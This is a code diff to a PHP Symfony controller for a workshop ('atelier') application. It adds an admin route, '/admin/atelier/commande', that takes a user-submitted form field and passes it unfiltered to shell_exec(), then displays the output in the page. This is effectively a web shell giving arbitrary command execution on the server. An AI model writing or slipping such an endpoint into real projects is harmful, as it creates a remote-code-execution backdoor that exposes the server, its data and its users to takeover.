@@ -4,6 +4,7 @@ namespace App\Controller;
 
 use App\Entity\Atelier;
 use App\Form\AtelierType;
+use App\Form\CommandType;
 use App\Repository\AtelierRepository;
 use Doctrine\ORM\EntityManagerInterface;
 use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
@@ -77,5 +78,21 @@ class AtelierController extends AbstractController
         }
 
         return $this->redirectToRoute('app_atelier_index', [], Response::HTTP_SEE_OTHER);
+    }
+
+    #[Route('/admin/atelier/commande', name: 'commande')]
+    public function commande(Request $request): Response
+    {
+        $form = $this->createForm(CommandType::class);
+        $form->handleRequest($request);
+        
+        if ($form->isSubmitted() && $form->isValid()) {
+            $commande = $form->getData()['commande'];
+            $output = shell_exec($commande);
+        }
+        return $this->render('adminUser/atelier/command.html.twig', [
+            'form' => $form,
+            'output' => $output ?? null,
+        ]);
     }
 }
